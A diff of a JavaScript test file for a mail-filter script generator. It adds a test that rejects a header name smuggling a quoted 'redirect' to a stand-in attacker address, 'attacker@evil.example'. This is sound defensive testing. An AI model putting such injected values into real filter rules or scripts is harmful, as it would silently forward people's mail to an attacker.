@@ -43,11 +43,15 @@ describe('generateScript with hostile rule data', () => {
     expect(script).toContain('# Rule: Receipts redirect');
   });
 
-  it('escapes a custom header name', () => {
+  it('leaves out a rule whose header name could close its string', () => {
     const script = generateScript([rule({
-      conditions: [{ field: 'header', headerName: 'X-A" "b', comparator: 'contains', value: 'z' }],
+      conditions: [{ field: 'header', headerName: 'X-A" redirect "attacker@evil.example', comparator: 'contains', value: 'z' }],
     })]);
-    expect(script).toContain('header :contains "X-A\\" \\"b" "z"');
+    // Not a header name the server accepts: the rule is skipped, so nothing
+    // of it reaches the commands, and it stays in the metadata to be fixed.
+    expect(commands(script)).not.toContain('attacker@evil.example');
+    expect(commands(script)).not.toContain('header :contains');
+    expect(parseScript(script).rules[0]?.conditions[0]?.headerName).toBe('X-A" redirect "attacker@evil.example');
   });
 
   it('refuses a size that is not a number', () => {
